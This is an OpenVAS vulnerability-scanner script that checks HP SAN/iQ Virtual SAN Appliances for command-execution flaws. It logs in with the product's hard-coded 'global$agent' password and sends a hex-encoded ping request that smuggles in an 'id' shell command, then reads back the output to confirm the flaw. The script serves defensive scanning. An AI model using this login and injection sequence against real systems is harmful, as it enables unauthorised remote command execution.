###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_saniq_virtual_san_app_mult_param_rce_vuln.nasl 11580 2018-09-25 06:06:13Z cfischer $
#
# HP SAN/iQ Virtual SAN Appliance Multiple Parameters Command Execution Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802455");
  script_version("$Revision: 11580 $");
  script_cve_id("CVE-2012-2986", "CVE-2012-4362");
  script_bugtraq_id(55133);
  script_tag(name:"cvss_base", value:"7.7");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-25 08:06:13 +0200 (Tue, 25 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-09-06 11:32:54 +0530 (Thu, 06 Sep 2012)");
  script_name("HP SAN/iQ Virtual SAN Appliance Multiple Parameters Command Execution Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/unknown", 13838);

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/441363");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18893/");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  commands the context of an application.");
  script_tag(name:"affected", value:"HP SAN/iQ version 9.5 and prior on HP Virtual SAN Appliance");
  script_tag(name:"insight", value:"The falws are due to,

  - An error in 'lhn/public/network/ping' fails to handle the shell meta
  characters in the first, third and fourth parameters.

  - It has a hard coded password of L0CAlu53R for the global$agent account,
  which allows remote attackers to obtain access to a management service
  via a login request to TCP port 13838.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running HP SAN/iQ Virtual SAN Appliance and is prone
  to multiple command execution vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("misc_func.inc");
include("byte_func.inc");

## Create a packet with  command to be executed
function create_packet()
{
  cmd = ""; packet = "";
  cmd = _FCT_ANON_ARGS[0]; ##  holds command to be executed
  packet = crap(data:raw_string(0x00), length:7) + raw_string(0x01) +
           mkdword(strlen(cmd)) + crap(data:raw_string(0x00), length:15) +
           raw_string(0x14,0xff,0xff,0xff,0xff) + cmd ;
  return packet;
}

function hydra_send_recv()
{
  socket=""; request= ""; header=""; data="";
  socket = _FCT_ANON_ARGS[0];
  request = _FCT_ANON_ARGS[1];

  send(socket:socket, data:request);
  header = recv(socket:socket, length:32);

  data = recv(socket:socket,length:1024);
  return data;
}

port = get_unknown_port( default:13838 );
soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

# login with a hard coded password
login = create_packet('login:/global$agent/L0CAlu53R/Version "9.5.0"');
res = hydra_send_recv(soc, login);

if(res && 'OK: Login' >< res)
{
  req = crap(data:raw_string(0x00), length:7) + raw_string(0x01,0x00,
        0x00, 0x00, 0x3c) + crap(data:raw_string(0x00), length:15) +
        raw_string(0x14, 0xff, 0xff, 0xff, 0xff, 0x67, 0x65, 0x74,
        0x3a, 0x2f, 0x6c, 0x68, 0x6e, 0x2f, 0x70, 0x75, 0x62, 0x6c,
        0x69, 0x63, 0x2f, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b,
        0x2f, 0x70, 0x69, 0x6e, 0x67, 0x2f, 0x31, 0x32, 0x37, 0x2e,
        0x30, 0x2e, 0x30, 0x2e, 0x31, 0x2f, 0x31, 0x32, 0x37, 0x2e,
        0x30, 0x2e, 0x30, 0x2e, 0x31, 0x2f, 0x36, 0x34, 0x2f, 0x31,
        0x7c, 0x69, 0x64, 0x20, 0x23, 0x2f, 0x00);

  send(socket:soc, data:req);
  headr = recv(socket:soc, length:32);

  res = recv(socket:soc, length:1024);

}

close(soc);

if(res && egrep(string:res, pattern:'uid=[0-9]+.*gid=[0-9]+.*')){
  security_message( port:port );
  exit( 0 );
}

exit( 99 );